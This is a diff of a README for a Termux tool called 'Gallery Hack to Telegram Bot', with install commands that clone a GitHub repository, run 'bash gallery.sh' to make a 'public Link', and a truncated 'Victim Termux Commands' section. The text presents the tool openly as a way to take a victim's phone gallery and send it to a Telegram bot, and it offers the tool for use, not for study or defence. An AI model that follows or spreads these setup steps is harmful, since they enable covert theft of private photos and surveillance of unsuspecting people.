@@ -1,7 +1,7 @@
 <h1 align="center">
   <u>Gallery Hack to Telegram Bot</u>  
   <br>
-  <a href="https">🎥 Demo Video</a>
+  <a href="https://youtu.be/M7EJ5-BoOvs">🎥 Demo Video</a>
 </h1>
 
 ### [TERMUX] Install All Comments
@@ -13,7 +13,7 @@ pkg update && pkg upgrade -y
 pkg install -y git openssh python wget
 ```
 ```
-git clone https://github.com/Master-xyx/BestA
+git clone https://github.com/Master-xyx/BestA.git
 ```
 ```
 cd BestA
@@ -37,6 +37,10 @@ nano numberinfo.py
 ### Save file CTRL x y Enter 
 
 save and next Commend
+### public Link 🖇️ 
+```
+bash gallery.sh
+```
 
 ### Victim Termux Commands 
 ```
